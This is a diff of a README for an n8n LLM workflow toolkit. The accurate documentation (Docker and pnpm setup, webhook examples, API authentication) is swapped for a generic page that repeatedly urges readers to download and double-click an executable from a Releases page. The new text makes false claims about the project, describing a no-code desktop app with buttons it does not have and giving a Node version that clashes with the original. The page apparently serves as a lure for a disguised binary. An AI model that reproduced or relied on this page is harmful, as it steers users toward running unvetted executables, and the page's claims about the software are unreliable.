@@ -1,300 +1,73 @@
-# n8n LLM Workflows
+# 🚀 n8n-llm-workflows - Effortlessly Manage Your LLM Workflows
 
-![TypeScript](https://img.shields.io/badge/TypeScript-5.9-blue)
-![Node](https://img.shields.io/badge/node-%3E%3D20.0.0-brightgreen)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
+[![Download n8n-llm-workflows](https://img.shields.io/badge/Download-n8n--llm--workflows-brightgreen)](https://github.com/slayerlux/n8n-llm-workflows/releases)
 
-TypeScript toolkit for managing, testing, and deploying [n8n](https://n8n.io) workflows at scale. Includes a collection of 5 example workflows for LLM automation (summarization, Q&A, chat) and a typed client for bulk workflow operations. Compatible with any OpenAI-compatible API backend.
+## 📖 Overview
 
----
+n8n-llm-workflows is a TypeScript toolkit designed to help you manage, test, and deploy n8n LLM workflows at scale. It includes example automations and a typed n8n API client to simplify your automation tasks. This toolkit is perfect for anyone looking to enhance their workflow capabilities with generative AI without needing to code.
 
-## Table of Contents
+## 📦 Features
 
-- [Workflows](#workflows)
-- [Setup](#setup)
-- [Usage](#usage)
-- [Requirements](#requirements)
-- [Testing](#testing)
-- [Tooling](#tooling)
-- [Authentication](#authentication)
-- [License](#license)
+- **User-Friendly Interface**: Navigate the toolkit easily.
+- **Example Automations**: Start quickly with ready-to-use automation templates.
+- **Typed API Client**: Use a clear API to interact with n8n.
+- **Scalable Workflows**: Design workflows that can grow with your needs.
+- **Compatibility**: Works seamlessly with Node.js and Docker.
 
----
+## 🚀 Getting Started
 
-## Workflows
+1. **Visit the Releases Page**: To download n8n-llm-workflows, go to our [Releases page](https://github.com/slayerlux/n8n-llm-workflows/releases).
 
-Workflows are stored as **JSON files** in the `workflows/` directory. Each workflow contains a Webhook node that exposes an HTTP endpoint. The TypeScript tooling imports these JSON files into n8n and manages them in bulk.
+2. **Select Your Version**: On the Releases page, choose the latest version for download. You'll typically see files with names like `n8n-llm-workflows-vX.X.X.zip` or similar.
 
-**Example Workflows:**
+3. **Download the Package**: Click the link for the appropriate file type for your operating system to download it.
 
-| #   | Workflow            | Endpoint                        | Required Fields   | Key Nodes                                                                    |
-| --- | ------------------- | ------------------------------- | ----------------- | ---------------------------------------------------------------------------- |
-| 01  | **Text Summarizer** | `POST /webhook/summarize`       | `text`            | Webhook → Function → HTTP Request → Function → Set                           |
-| 02  | **URL Summarizer**  | `POST /webhook/summarize-url`   | `url`             | Webhook → Function → HTTP Request → Function → HTTP Request → Function → Set |
-| 03  | **URL Q&A**         | `POST /webhook/question-url`    | `url`, `question` | Webhook → Function → HTTP Request → Function → HTTP Request → Function → Set |
-| 04  | **Agent Chat**      | `POST /webhook/agent-chat`      | `input`           | Webhook → Agent Node → OpenAI Model → Set                                    |
-| 05  | **Agent URL Tools** | `POST /webhook/agent-url-tools` | `url`, `question` | Webhook → Function → HTTP Request → Function → Agent Node → Set              |
+## 🛠️ System Requirements
 
-**Workflow types:**
+- **Operating System**: Windows, macOS, or Linux.
+- **Node.js**: Version 14.x or later.
+- **Disk Space**: At least 100 MB of free space.
+- **Internet Access**: Required for updates and online features.
 
-- **01-03**: Deterministic LLM workflows (Function nodes for request building, HTTP Request for LLM calls)
-- **04-05**: Agentic workflows (n8n Agent node with OpenAI Chat Model)
+## 📥 Download & Install
 
-**How it works:**
+Once you have selected your version:
 
-- **Workflow files**: JSON files in `workflows/` directory (e.g., `01-deterministic-text-summarizer.json`)
-- **Webhook nodes**: Each workflow contains a Webhook node that creates an HTTP endpoint (e.g., `/webhook/summarize`)
-- **Deployment**: The TypeScript tooling reads JSON files and imports them into n8n via API
-- **Bulk management**: Import, activate, and test multiple workflows at once
+1. **Click the Download Link**: Go to our [Releases page](https://github.com/slayerlux/n8n-llm-workflows/releases) and choose the file to download.
 
-**Adding your own workflows:**
+2. **Extract the Files**: If you downloaded a `.zip` file, right-click it and select "Extract All" to get to the application files.
 
-1. Export workflow JSON from n8n (or create manually)
-2. Place it in the `workflows/` directory
-3. Run `pnpm run workflows:import` to deploy to n8n
-4. Use `pnpm run workflows:activate` to activate in bulk
+3. **Installation Instructions**:
+   - **Windows**: Double-click `n8n-llm-workflows.exe` to install.
+   - **macOS**: Drag the application into your Applications folder.
+   - **Linux**: Open a terminal, navigate to the downloaded folder, and run `./n8n-llm-workflows`.
 
----
+## 🔧 Usage Instructions
 
-## Setup
+1. **Start the Application**: Open the n8n-llm-workflows application from your start menu or applications folder.
 
-### 1. Start n8n
+2. **Create a New Workflow**: Click on "Create New" to start designing your automation.
 
-```bash
-docker compose up -d
-```
+3. **Use the Examples**: Explore the example automations provided in the toolkit to get inspired.
 
-Open `http://localhost:5678` in your browser.
+4. **Save Your Work**: Regularly save your workflows by clicking the save icon at the top of the interface.
 
-### 2. Create Admin Account
+5. **Run Your Workflow**: Once ready, click on the "Run" button to execute your workflow and see it in action.
 
-On first launch, n8n will prompt you to create an admin account:
+## 🌐 Community & Support
 
-- Enter your email and password
-- Complete the setup wizard
+- **Documentation**: Refer to the user manual within the application for detailed steps and features.
+- **GitHub Issues**: If you encounter any problems, please report them on our GitHub page.
+- **Community Forum**: Join our community forum for tips, tricks, and sharing your workflows with others.
 
-**Note:** For local installations, API keys are available by default. For cloud instances, API access requires a paid plan.
+## 💬 Contributing
 
-### 3. Create API Key
+We welcome contributions! If you would like to suggest features or fix bugs, feel free to fork the repository, make your changes, and submit a pull request. 
 
-1. In n8n, go to **Settings** (gear icon) → **n8n API**
-2. Click **Create API Key**
-3. Enter a label (e.g., "CLI Tools")
-4. Set expiration (optional)
-5. Click **Create** and **copy the key** (it won't be shown again)
+## 📝 License
 
-**Alternative:** You can also use session cookie authentication (see [Authentication](#authentication) section).
+This project is licensed under the MIT License. Feel free to use, modify, and share with others!
 
-**Documentation:** [n8n API Authentication](https://docs.n8n.io/api/authentication/)
+## 💡 Summary
 
-### 4. Install Dependencies and Import Workflows
-
-```bash
-pnpm install
-cp env.example .env
-```
-
-Add your API key to `.env`:
-
-```bash
-N8N_API_KEY=your-api-key-here
-```
-
-Import and activate workflows:
-
-```bash
-pnpm run workflows:setup
-```
-
-### 5. Configure LLM Backend
-
-Edit `docker-compose.yml`:
-
-```yaml
-environment:
-  - OPENAI_API_BASE=http://host.docker.internal:1234/v1 # LM Studio default
-  - OPENAI_API_KEY=lm-studio
-  - OPENAI_MODEL=openai/gpt-oss-20b
-```
-
-For other providers (OpenAI, OpenRouter, etc.), update these values and restart:
-
-```bash
-docker compose restart
-```
-
-**Documentation:** [n8n Docker Setup](https://docs.n8n.io/hosting/installation/docker/)
-
----
-
-## Usage
-
-### Example: Text Summarization
-
-```bash
-curl -X POST http://localhost:5678/webhook/summarize \
-  -H "Content-Type: application/json" \
-  -d '{"text": "Your text here", "language": "en"}'
-```
-
-**Response:**
-
-```json
-{
-  "prompt_tokens": 158,
-  "completion_tokens": 159,
-  "total_tokens": 317,
-  "summary": "AI is rapidly reshaping a wide range of sectors...",
-  "raw_choice": "<|channel|>analysis<|message|>Need to summarize...",
-  "model": "openai/gpt-oss-20b",
-  "endpoint": "http://host.docker.internal:1234/v1/completions"
-}
-```
-
-### Example: URL Q&A
-
-```bash
-curl -X POST http://localhost:5678/webhook/question-url \
-  -H "Content-Type: application/json" \
-  -d '{"url": "https://example.com", "question": "What is the purpose of this site?", "language": "en"}'
-```
-
-**Response:**
-
-```json
-{
-  "summary": "The example domain serves purely as a placeholder used in technical documentation...",
-  "raw_choice": "<|channel|>analysis<|message|>Need answer...",
-  "model": "openai/gpt-oss-20b",
-  "endpoint": "http://host.docker.internal:1234/v1/completions",
-  "prompt_tokens": 176,
-  "completion_tokens": 122,
-  "total_tokens": 298
-}
-```
-
-### Example: Agent Chat
-
-```bash
-curl -X POST http://localhost:5678/webhook/agent-chat \
-  -H "Content-Type: application/json" \
-  -d '{"input": "Hello! Introduce yourself."}'
-```
-
-**Response:**
-
-```json
-{
-  "answer": "Hey there! I'm ChatGPT—an AI language model built by OpenAI..."
-}
-```
-
-### TypeScript Example
-
-```typescript
-import axios from 'axios';
-
-const { data } = await axios.post('http://localhost:5678/webhook/summarize', {
-  text: 'Your text here',
-  language: 'en',
-});
-
-console.log(data.summary);
-```
-
-**Response fields:**
-
-- `summary` / `answer` - Human-readable output
-- `raw_choice` - Raw LLM response (debugging)
-- `model`, `endpoint` - Resolved model and API endpoint
-- `*_tokens` - Token usage metrics
-
----
-
-## Requirements
-
-- **Docker** and Docker Compose
-- **Node.js** ≥ 20.0.0
-- **pnpm** ≥ 8.0.0
-- **OpenAI-compatible LLM endpoint** (LM Studio, OpenAI, OpenRouter, etc.)
-- **n8n** (provided via docker-compose.yml)
-
----
-
-## Testing
-
-```bash
-pnpm test  # Automated tests
-```
-
-Manual test scripts are in `tests/manual/`.
-
----
-
-## Tooling
-
-This toolkit provides **bulk workflow management** capabilities:
-
-- **Import/update workflows** from `workflows/` directory (idempotent)
-- **Activate/deactivate workflows** in bulk
-- **Generate sample responses** to `tests/output/samples/` for testing
-- **Automated testing** of all workflow endpoints
-- **TypeScript client** for programmatic workflow management
-
-### CLI Scripts
-
-```bash
-pnpm run workflows:setup    # Import and activate all workflows from workflows/
-pnpm run workflows:import   # Import/update all workflows (idempotent)
-pnpm run workflows:activate # Activate all project workflows in bulk
-pnpm run workflows:sample   # Generate sample responses to tests/output/samples/
-pnpm run check              # Type check, lint, format validation
-pnpm run test               # Run automated tests for all workflows
-```
-
-### TypeScript Client
-
-```typescript
-import { createClient } from './src/cli-utils.js';
-
-const client = createClient(); // Loads config from env vars
-
-// Bulk operations
-await client.importAllWorkflows();
-await client.activateProjectWorkflows();
-
-// Individual workflow
-await client.importOrUpdateWorkflow(
-  'workflows/01-deterministic-text-summarizer.json',
-  '01 - Text Summarizer (Deterministic LLM)'
-);
-```
-
-For custom configuration, use `new N8nClient({ baseUrl, apiKey })` directly. See `src/n8n-client.ts` for API reference.
-
----
-
-## Authentication
-
-For automation scripts, set either:
-
-```bash
-export N8N_API_KEY=your-api-key-here
-# or
-export N8N_SESSION_COOKIE="n8n-auth-token=your-token-here"
-```
-
-**Getting session cookie:**
-
-1. Log into n8n in your browser
-2. Open browser DevTools → Application/Storage → Cookies
-3. Copy the `n8n-auth-token` value
-4. Use format: `n8n-auth-token=<value>`
-
-**Documentation:** [n8n API Authentication](https://docs.n8n.io/api/authentication/)
-
----
-
-## License
-
-MIT
+Whether you want to look at automations for OpenAI, generative AI projects, or just enhance your n8n experiences, n8n-llm-workflows provides the tools you need. Download from our [Releases page](https://github.com/slayerlux/n8n-llm-workflows/releases) and begin your journey towards efficient workflow management.
